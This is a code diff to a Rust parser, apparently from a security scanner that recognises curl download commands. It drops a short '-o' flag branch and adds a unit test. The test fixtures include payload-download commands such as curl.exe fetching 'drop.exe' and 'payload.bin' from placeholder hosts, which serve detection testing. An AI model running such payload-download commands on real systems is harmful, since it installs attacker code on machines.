@@ -1847,11 +1847,6 @@ fn parse_glued_curl_download(text: &str) -> Option<(String, Option<String>)> {
     } else if let Some(idx) = find_ascii_case_insensitive_from(&url, "--output", 0) {
         dst = Some(url[idx + "--output".len()..].trim().to_string());
         url.truncate(idx);
-    } else if let Some(idx) = find_ascii_case_insensitive_from(&url, "-o", 0) {
-        if idx > 0 {
-            dst = Some(url[idx + "-o".len()..].trim().to_string());
-            url.truncate(idx);
-        }
     }
 
     let url = url.trim_end_matches(['.', ',', ';', ':']).to_string();
@@ -6461,7 +6456,8 @@ mod decimal_ip_url_tests {
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod curl_redirect_parser_tests {
     use super::{
-        normalize_curl_text, parse_curl_like_download, parse_curl_output_dst, split_words,
+        normalize_curl_text, parse_curl_like_download, parse_curl_output_dst,
+        parse_glued_curl_download, split_words,
     };
 
     #[test]
@@ -6498,6 +6494,19 @@ mod curl_redirect_parser_tests {
             Some((
                 "https://curl-short.example/payload.bin".to_string(),
                 Some("C:\\Temp\\payload.bin".to_string())
+            ))
+        );
+    }
+
+    #[test]
+    fn glued_curl_does_not_split_short_output_inside_url() {
+        assert_eq!(
+            parse_glued_curl_download(
+                r#"curl.exe "https://curl-long-output.example/drop.exe" --output out.exe"#
+            ),
+            Some((
+                "https://curl-long-output.example/drop.exe".to_string(),
+                None
             ))
         );
     }
